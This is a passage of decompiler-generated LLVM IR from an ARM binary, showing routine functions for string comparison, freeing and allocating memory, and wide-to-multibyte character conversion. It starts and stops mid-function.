  %v0_12ea4.pre = load i32, i32* @r4, align 4
  br i1 %v2_12e88, label %dec_label_pc_12ea0, label %dec_label_pc_12e90

dec_label_pc_12e90:                               ; preds = %bb73
  store i32 %v0_12ea4.pre, i32* @r0, align 4
  %v1_12e98 = inttoptr i32 %v0_12ea4.pre to i8*
  %v2_12e98 = call i32 @function_1476c(i8* %v1_12e98)
  store i32 %v2_12e98, i32* %r0.global-to-local, align 4
  %v0_12e9c = load i32, i32* @r4, align 4
  %v2_12e9c = add i32 %v0_12e9c, %v2_12e98
  store i32 %v2_12e9c, i32* @r4, align 4
  br label %dec_label_pc_12ea0

dec_label_pc_12ea0:                               ; preds = %bb73, %dec_label_pc_12e90
  %v0_12ea4 = phi i32 [ %v2_12e9c, %dec_label_pc_12e90 ], [ %v0_12ea4.pre, %bb73 ]
  %v0_12ea0 = load i32, i32* @r6, align 4
  %v1_12ea0 = add i32 %v0_12ea0, 1
  store i32 %v1_12ea0, i32* @r6, align 4
  %v1_12ea4 = inttoptr i32 %v0_12ea4 to i8*
  %v2_12ea4 = load i8, i8* %v1_12ea4, align 1
  %v3_12ea4 = zext i8 %v2_12ea4 to i32
  store i32 %v3_12ea4, i32* %r2.global-to-local, align 4
  %v2_12ea8 = icmp eq i8 %v2_12ea4, 0
  store i1 %v2_12ea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ea8, label %dec_label_pc_12ec0, label %dec_label_pc_12ea0.dec_label_pc_12eb0_crit_edge

dec_label_pc_12ea0.dec_label_pc_12eb0_crit_edge:  ; preds = %dec_label_pc_12ea0
  %v0_12eb0.pre = load i32, i32* @r7, align 4
  %v1_12eb0 = inttoptr i32 %v0_12eb0.pre to i8*
  %v2_12eb0 = load i8, i8* %v1_12eb0, align 1
  %v3_12eb0 = zext i8 %v2_12eb0 to i32
  store i32 %v3_12eb0, i32* %r3.global-to-local, align 4
  %v9_12eb4 = icmp eq i8 %v2_12eb0, %v2_12ea4
  store i1 %v9_12eb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12eb4, label %dec_label_pc_12ec0, label %bb74

bb74:                                             ; preds = %dec_label_pc_12eb0.preheader, %dec_label_pc_12ea0.dec_label_pc_12eb0_crit_edge
  %v2_12dfc88 = phi i32 [ %v1_12ea0, %dec_label_pc_12ea0.dec_label_pc_12eb0_crit_edge ], [ %v1_12de0, %dec_label_pc_12eb0.preheader ]
  %v0_12dfc87 = phi i32 [ %v0_12ea4, %dec_label_pc_12ea0.dec_label_pc_12eb0_crit_edge ], [ %v0_12ea413, %dec_label_pc_12eb0.preheader ]
  %v2_12eb8 = load i32, i32* @sb, align 4
  %v3_12eb8 = sub i32 %v2_12dfc88, %v2_12eb8
  %v5_12eb8 = xor i32 %v2_12eb8, %v2_12dfc88
  %v6_12eb8 = xor i32 %v3_12eb8, %v2_12dfc88
  %v7_12eb8 = and i32 %v6_12eb8, %v5_12eb8
  %v8_12eb8 = icmp slt i32 %v7_12eb8, 0
  %v9_12eb8 = icmp slt i32 %v3_12eb8, 0
  %v10_12eb8 = icmp eq i32 %v2_12dfc88, %v2_12eb8
  store i1 %v10_12eb8, i1* %cpsr_z.global-to-local, align 1
  %v2_12ebc = xor i1 %v9_12eb8, %v8_12eb8
  br i1 %v2_12ebc, label %dec_label_pc_12dec, label %dec_label_pc_12ec0

dec_label_pc_12ec0:                               ; preds = %dec_label_pc_12eb0.preheader, %bb74, %dec_label_pc_12ea0, %dec_label_pc_12ea0.dec_label_pc_12eb0_crit_edge, %dec_label_pc_12ea4.preheader
  %v0_12ec4 = phi i32 [ %v1_12de0, %dec_label_pc_12ea4.preheader ], [ %v1_12de0, %dec_label_pc_12eb0.preheader ], [ %v2_12dfc88, %bb74 ], [ %v1_12ea0, %dec_label_pc_12ea0 ], [ %v1_12ea0, %dec_label_pc_12ea0.dec_label_pc_12eb0_crit_edge ]
  store i32 %v3_12be4, i32* %r2.global-to-local, align 4
  %v9_12ec4 = icmp eq i32 %v0_12ec4, %v3_12be4
  store i1 %v9_12ec4, i1* %cpsr_z.global-to-local, align 1
  %v6_12ec8 = icmp slt i32 %v0_12ec4, %v3_12be4
  br i1 %v6_12ec8, label %dec_label_pc_12ecc, label %dec_label_pc_12ed8

dec_label_pc_12ecc:                               ; preds = %dec_label_pc_12ec0
  %v0_12ecc = load i32, i32* @r8, align 4
  %v1_12ecc = and i32 %v0_12ecc, 1048576
  %v2_12ecc = icmp eq i32 %v1_12ecc, 0
  store i1 %v2_12ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ecc, label %dec_label_pc_12c24.backedge, label %dec_label_pc_12ed4

dec_label_pc_12ed4:                               ; preds = %dec_label_pc_12ecc, %dec_label_pc_12d8c, %.thread, %dec_label_pc_12bc0
  br label %dec_label_pc_12ed8

dec_label_pc_12ed8:                               ; preds = %dec_label_pc_12ec0, %dec_label_pc_12ca8, %dec_label_pc_12ed4
  %v0_12ed8 = phi i32 [ %v0_12cb8, %dec_label_pc_12ca8 ], [ 0, %dec_label_pc_12ed4 ], [ %v0_12ec4, %dec_label_pc_12ec0 ]
  store i32 %v0_12ed8, i32* %r0.global-to-local, align 4
  store i32 %v3_12bc0, i32* @r4, align 4
  store i32 %v6_12bc0, i32* @r5, align 4
  store i32 %v9_12bc0, i32* @r6, align 4
  store i32 %v12_12bc0, i32* @r7, align 4
  store i32 %v15_12bc0, i32* @r8, align 4
  store i32 %v18_12bc0, i32* @sb, align 4
  store i32 %v21_12bc0, i32* @sl, align 4
  store i32 %v24_12bc0, i32* @fp, align 4
  ret i32 %v0_12ed8

; uselistorder directives
  uselistorder i32 %v0_12ed8, { 1, 0 }
  uselistorder i32 %v0_12ec4, { 0, 2, 1 }
  uselistorder i32 %v3_12eb8, { 1, 0 }
  uselistorder i32 %v2_12eb8, { 1, 0, 2 }
  uselistorder i32 %v2_12dfc88, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_12eb4, { 1, 0 }
  uselistorder i32 %v0_12ea4.pre, { 0, 2, 1 }
  uselistorder i32 %v5_12e38, { 1, 0, 2, 3 }
  uselistorder i1 %v9_12eb486, { 1, 0 }
  uselistorder i1 %v9_12ddc, { 1, 0 }
  uselistorder i32 %v3_12db4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_12d8c, { 1, 0 }
  uselistorder i1 %v8_12d84, { 1, 0 }
  uselistorder i32 %v3_12d54, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_12d44, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_12d2c, { 1, 0, 2 }
  uselistorder i32 %v1_12d1c, { 1, 0, 2 }
  uselistorder i32 %v0_12d08, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12d00, { 1, 0 }
  uselistorder i32 %v1_12cec, { 1, 0 }
  uselistorder i32 %v1_12ce8, { 1, 0 }
  uselistorder i32 %v1_12ca8, { 2, 0, 1 }
  uselistorder i32 %v0_12c90, { 1, 0 }
  uselistorder i32 %v1_12c80, { 0, 2, 1 }
  uselistorder i1 %v2_12db0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12c0c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_12c00, { 2, 1, 0 }
  uselistorder i32 %v3_12be8, { 1, 0 }
  uselistorder i32 %v3_12be4, { 2, 1, 0 }
  uselistorder i32 %v1_12bdc, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 27, 26, 25, 6, 5, 8, 9, 1, 7, 11, 10, 13, 12, 14, 17, 15, 16, 21, 18, 19, 20, 24, 22, 23, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 13, 14, 15, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_12ed8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ec0, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_12ea0, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12e54, { 1, 0 }
  uselistorder label %dec_label_pc_12c24.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12dcc, { 1, 0 }
  uselistorder label %dec_label_pc_12d8c, { 1, 0 }
  uselistorder label %dec_label_pc_12d80, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12d44, { 1, 0 }
  uselistorder label %dec_label_pc_12c78, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @function_12ee8(i32* %arg1) local_unnamed_addr {
dec_label_pc_12ee8:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_12eec = icmp eq i32* %arg1, null
  br i1 %v2_12eec, label %dec_label_pc_12f14, label %dec_label_pc_12ef4

dec_label_pc_12ef4:                               ; preds = %dec_label_pc_12ee8
  %v2_12ef4 = load i32, i32* %arg1, align 4
  %v1_12ef8 = inttoptr i32 %v2_12ef4 to i16*
  %v2_12ef8 = call i32 @function_ce24(i16* %v1_12ef8)
  %v0_12efc = load i32, i32* @r4, align 4
  %v1_12efc = add i32 %v0_12efc, 20
  %v2_12efc = inttoptr i32 %v1_12efc to i32*
  %v3_12efc = load i32, i32* %v2_12efc, align 4
  %v2_12f00 = icmp eq i32 %v3_12efc, 0
  br i1 %v2_12f00, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_12ef4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_12ef4, %bb
  store i32 77580, i32* @lr, align 4
  %v1_12f08 = xor i1 %v2_12f00, true
  call void @__pseudo_cond_branch(i1 %v1_12f08, i32 ptrtoint (i32* @global_var_108e4.259 to i32))
  %v0_12f0c = load i32, i32* @r4, align 4
  store i32 %v0_12f0c, i32* @r0, align 4
  %v0_12f10 = call i32 @function_108e4()
  br label %dec_label_pc_12f14

dec_label_pc_12f14:                               ; preds = %dec_label_pc_12ee8, %bb6
  %v1_12f18 = phi i32 [ 0, %dec_label_pc_12ee8 ], [ %v0_12f10, %bb6 ]
  ret i32 %v1_12f18

; uselistorder directives
  uselistorder label %dec_label_pc_12f14, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_12f1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12f1c:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f28 = load i32, i32* @r4, align 4
  store i32 %v3_12f28, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1a378.580 to i32), i32* @r1, align 4
  %v0_12f30 = load i32, i32* @r0, align 4
  %v2_12f30 = call i32 @function_cfd8(i32 %v0_12f30, i32 ptrtoint (i32* @global_var_1a378.580 to i32))
  store i32 %v2_12f30, i32* %r0.global-to-local, align 4
  store i32 %v2_12f30, i32* @r4, align 4
  %v2_12f34 = icmp eq i32 %v2_12f30, 0
  br i1 %v2_12f34, label %bb, label %dec_label_pc_12f40

bb:                                               ; preds = %dec_label_pc_12f1c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_12f40:                               ; preds = %dec_label_pc_12f1c
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12f48 = call i32 @function_14de0(i32 1, i32 24)
  store i32 %v2_12f48, i32* %r0.global-to-local, align 4
  %v2_12f4c = icmp eq i32 %v2_12f48, 0
  br i1 %v2_12f4c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_12f40
  %v1_12f50 = load i32, i32* @r4, align 4
  %v3_12f50 = inttoptr i32 %v2_12f48 to i32*
  store i32 %v1_12f50, i32* %v3_12f50, align 4
  %v1_12f58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_12f40, %bb4
  %v1_12f58 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_12f40 ], [ %v1_12f58.pre, %bb4 ]
  %v2_12f54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12f54, i32* @r4, align 4
  ret i32 %v1_12f58

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_12f64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12f64:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_12f64 = load i32, i32* @lr, align 4
  %v2_12f68 = icmp eq i32 %arg1, 0
  br i1 %v2_12f68, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_12f64
  br label %bb11

bb:                                               ; preds = %dec_label_pc_12f64
  %v3_12f70 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_12f98 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_12f84 = phi i32 [ %arg1, %.thread ], [ %v3_12f70, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_12f80 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_12f80, i32* @ip, align 4
  %v2_12f88 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_12f80, i32* %stack_var_-16, align 4
  store i32 %v0_12f98, i32* %stack_var_-12, align 4
  %v5_12fa0 = inttoptr i32 %v0_12f84 to i8*
  %v6_12fa0 = call i32 @function_12fdc(i8* %v5_12fa0, i32 %v2_12f88, i32 1, i32 16, i32 %arg3)
  %v2_12fa4 = icmp eq i32 %v6_12fa0, 0
  br i1 %v2_12fa4, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_12fb4 = phi i32 [ %v6_12fa0, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_12f64, i32* @lr, align 4
  ret i32 %v1_12fb4

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_12fb8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_12fb8:
  store i32 %arg1, i32* @r3, align 4
  %v0_12fcc = load i32, i32* @r0, align 4
  %v1_12fcc = load i32, i32* @r1, align 4
  %v5_12fcc = inttoptr i32 %v0_12fcc to i8*
  %v6_12fcc = call i32 @function_12fdc(i8* %v5_12fcc, i32 %v1_12fcc, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_12fcc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_12fdc(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12fdc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12fdc = load i32, i32* @r4, align 4
  store i32 %v3_12fdc, i32* %stack_var_-12, align 4
  %v10_12fe0 = icmp eq i32 %tmp, %arg2
  store i1 %v10_12fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_12fe0, label %dec_label_pc_12ff8, label %bb

bb:                                               ; preds = %dec_label_pc_12fdc
  %v4_12fe4 = icmp eq i8* %arg1, null
  store i1 %v4_12fe4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_12fe4, label %dec_label_pc_12ff8.thread, label %bb39

dec_label_pc_12ff8.thread:                        ; preds = %bb
  %v2_12fe8 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_12ff8:                               ; preds = %dec_label_pc_12fdc
  %v2_12fe81 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_12ff8 = icmp eq i8* %arg1, null
  store i1 %v3_12ff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12ff8, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12ff8
  store i32 %v2_12fe81, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_12ff8, %dec_label_pc_12ff8.thread
  %storemerge20 = phi i32 [ %v2_12fe81, %dec_label_pc_12ff8 ], [ %v2_12fe8, %dec_label_pc_12ff8.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_1305428 = phi i32 [ %v2_12fe81, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_13010 = load i32, i32* @r3, align 4
  %v3_13010 = icmp uge i32 %v0_13010, %arg3
  %arg3.v0_13010 = select i1 %v3_13010, i32 %arg3, i32 %v0_13010
  store i32 %arg3.v0_13010, i32* %r5.global-to-local, align 4
  %v1_1301c = inttoptr i32 %arg2 to i32*
  %v2_1301c = load i32, i32* %v1_1301c, align 4
  store i32 %v2_1301c, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_13010, i32* %r0.global-to-local, align 4
  %v2_1306822 = icmp eq i32 %arg3.v0_13010, 0
  store i1 %v2_1306822, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1306822, label %dec_label_pc_13070, label %dec_label_pc_13028

dec_label_pc_13028:                               ; preds = %.thread14.thread, %dec_label_pc_13060.dec_label_pc_13028_crit_edge
  %v2_13054 = phi i32 [ %v2_13060, %dec_label_pc_13060.dec_label_pc_13028_crit_edge ], [ %v2_1305428, %.thread14.thread ]
  %v0_13034 = phi i32 [ %v0_13028.pre, %dec_label_pc_13060.dec_label_pc_13028_crit_edge ], [ %v2_1301c, %.thread14.thread ]
  %v1_13028 = inttoptr i32 %v0_13034 to i32*
  %v2_13028 = load i32, i32* %v1_13028, align 4
  %v7_1302c = icmp eq i32 %v2_13028, 127
  store i1 %v7_1302c, i1* %cpsr_z.global-to-local, align 1
  %v1_13030 = urem i32 %v2_13028, 256
  store i32 %v1_13030, i32* @ip, align 4
  %v1_13034 = add i32 %v0_13034, 4
  store i32 %v1_13034, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_13028, 128
  br i1 %tmp45, label %dec_label_pc_13050, label %dec_label_pc_1303c

dec_label_pc_1303c:                               ; preds = %dec_label_pc_13028
  %v0_1303c = call i32 @function_ce08()
  store i32 %v0_1303c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13048 = inttoptr i32 %v0_1303c to i32*
  store i32 84, i32* %v2_13048, align 4
  %v0_1307c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1307c

dec_label_pc_13050:                               ; preds = %dec_label_pc_13028
  %v2_13050 = icmp eq i32 %v1_13030, 0
  store i1 %v2_13050, i1* %cpsr_z.global-to-local, align 1
  %v1_13054 = trunc i32 %v2_13028 to i8
  %v3_13054 = inttoptr i32 %v2_13054 to i8*
  store i8 %v1_13054, i8* %v3_13054, align 1
  %v0_13058 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13058, label %.dec_label_pc_13070_crit_edge, label %dec_label_pc_13060

dec_label_pc_13060:                               ; preds = %dec_label_pc_13050
  %v0_13060 = load i32, i32* %lr.global-to-local, align 4
  %v1_13060 = load i32, i32* %r4.global-to-local, align 4
  %v2_13060 = add i32 %v1_13060, %v0_13060
  store i32 %v2_13060, i32* %lr.global-to-local, align 4
  %v0_13064 = load i32, i32* %r0.global-to-local, align 4
  %v1_13064 = add i32 %v0_13064, -1
  store i32 %v1_13064, i32* %r0.global-to-local, align 4
  %v2_13068 = icmp eq i32 %v1_13064, 0
  store i1 %v2_13068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13068, label %dec_label_pc_13070, label %dec_label_pc_13060.dec_label_pc_13028_crit_edge

dec_label_pc_13060.dec_label_pc_13028_crit_edge:  ; preds = %dec_label_pc_13060
  %v0_13028.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13028

.dec_label_pc_13070_crit_edge:                    ; preds = %dec_label_pc_13050
  %v1_13058 = load i32, i32* @ip, align 4
  store i32 %v1_13058, i32* %r2.global-to-local, align 4
  %v0_13070.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13070

dec_label_pc_13070:                               ; preds = %dec_label_pc_13060, %.dec_label_pc_13070_crit_edge, %.thread14.thread
  %v0_13070 = phi i32 [ %v0_13070.pre, %.dec_label_pc_13070_crit_edge ], [ %v2_1305428, %.thread14.thread ], [ %v2_13060, %dec_label_pc_13060 ]
  %v1_13070 = load i32, i32* @sp, align 4
  %v9_13070 = icmp eq i32 %v0_13070, %v1_13070
  store i1 %v9_13070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13070, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_13070
  %v1_13074 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_13074, i32* %v1_1301c, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_13070, %bb43
  %v0_13078 = load i32, i32* %r0.global-to-local, align 4
  %v1_13078 = load i32, i32* %r5.global-to-local, align 4
  %v2_13078 = sub i32 %v1_13078, %v0_13078
  store i32 %v2_13078, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1307c

dec_label_pc_1307c:                               ; preds = %dec_label_pc_1303c, %bb44
  %v0_1307c = phi i32 [ %v0_1307c.pre, %dec_label_pc_1303c ], [ %v2_13078, %bb44 ]
  store i32 %v0_1307c, i32* %r0.global-to-local, align 4
  %v2_13084 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13084, i32* %r4.global-to-local, align 4
  ret i32 %v0_1307c

; uselistorder directives
  uselistorder i32 %v0_1307c, { 1, 0 }
  uselistorder i32 %v1_13064, { 1, 0 }
  uselistorder i32 %v2_13060, { 0, 2, 1 }
  uselistorder i32 %v1_13030, { 1, 0 }
  uselistorder i32 %v2_13028, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1305428, { 1, 0 }
  uselistorder i32 %v2_12fe81, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 6, 1, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 0, 5, 6, 1, 3, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 4, 1, 2, 3, 9, 5, 8, 6, 7 }
  uselistorder i32 127, { 2, 0, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1307c, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_13070, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13028, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @function_1308c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1308c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_130a0 = call i32 @function_125d4(i32 %arg1, i32 3)
  store i32 %v2_130a0, i32* %r0.global-to-local, align 4
  %v7_130a4 = icmp eq i32 %v2_130a0, -1
  br i1 %v7_130a4, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_1308c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread

bb10:                                             ; preds = %dec_label_pc_1308c
  br label %.thread

.thread:                                          ; preds = %bb, %bb10
  %v1_130b8 = xor i1 %v7_130a4, true
  call void @__pseudo_cond_branch(i1 %v1_130b8, i32 ptrtoint (i32* @global_var_d500.581 to i32))
  %v1_130c4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_130c4

; uselistorder directives
  uselistorder i1 %v7_130a4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32)* @function_125d4, { 2, 3, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_130c8(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_130c8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_130c8 = load i32, i32* @r4, align 4
  store i32 %v3_130c8, i32* %stack_var_-24, align 4
  %v12_130c8 = load i32, i32* @r7, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_130e02 = icmp eq i32 %arg3, 0
  store i1 %v2_130e02, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_130e02, label %dec_label_pc_13170, label %dec_label_pc_130e8

dec_label_pc_130e0thread-pre-split:               ; preds = %dec_label_pc_130e8
  %v3_13100 = load i32, i32* %r6.global-to-local, align 4
  %v5_13100 = add i32 %v3_13100, %v3_130f8
  store i32 %v5_13100, i32* %r6.global-to-local, align 4
  %v4_13104 = load i32, i32* %r5.global-to-local, align 4
  %v5_13104 = sub i32 %v4_13104, %v3_130f8
  store i32 %v5_13104, i32* %r5.global-to-local, align 4
  %v2_130e0 = icmp eq i32 %v5_13104, 0
  store i1 %v2_130e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_130e0, label %dec_label_pc_130e0.dec_label_pc_13170.loopexit_crit_edge, label %dec_label_pc_130e0thread-pre-split.dec_label_pc_130e8_crit_edge

dec_label_pc_130e0thread-pre-split.dec_label_pc_130e8_crit_edge: ; preds = %dec_label_pc_130e0thread-pre-split
  %v3_130e8.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_130f4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130e8

dec_label_pc_130e8:                               ; preds = %dec_label_pc_130c8, %dec_label_pc_130e0thread-pre-split.dec_label_pc_130e8_crit_edge
  %v0_130f4 = phi i32 [ %v0_130f4.pre, %dec_label_pc_130e0thread-pre-split.dec_label_pc_130e8_crit_edge ], [ %tmp, %dec_label_pc_130c8 ]
  %v0_130f0 = phi i32 [ %v5_13100, %dec_label_pc_130e0thread-pre-split.dec_label_pc_130e8_crit_edge ], [ %arg2, %dec_label_pc_130c8 ]
  %v3_130e8 = phi i32 [ %v3_130e8.pre, %dec_label_pc_130e0thread-pre-split.dec_label_pc_130e8_crit_edge ], [ 2147483647, %dec_label_pc_130c8 ]
  %v0_130ec.in = phi i32 [ %v5_13104, %dec_label_pc_130e0thread-pre-split.dec_label_pc_130e8_crit_edge ], [ %arg3, %dec_label_pc_130c8 ]
  %v3_130ec = phi i32 [ %v5_13104, %dec_label_pc_130e0thread-pre-split.dec_label_pc_130e8_crit_edge ], [ %arg3, %dec_label_pc_130c8 ]
  %v0_130ec = icmp slt i32 %v0_130ec.in, 0
  %storemerge = select i1 %v0_130ec, i32 %v3_130e8, i32 %v3_130ec
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_130f0, i32* %r1.global-to-local, align 4
  %v1_130f4 = add i32 %v0_130f4, 4
  %v2_130f4 = inttoptr i32 %v1_130f4 to i32*
  %v3_130f4 = load i32, i32* %v2_130f4, align 4
  %v3_130f8 = call i32 @function_cd1c(i32 %v3_130f4, i32 %v0_130f0)
  %v1_130fc = icmp slt i32 %v3_130f8, 0
  %v2_130fc = icmp eq i32 %v3_130f8, 0
  store i1 %v2_130fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_130fc, label %dec_label_pc_1310c, label %dec_label_pc_130e0thread-pre-split

dec_label_pc_1310c:                               ; preds = %dec_label_pc_130e8
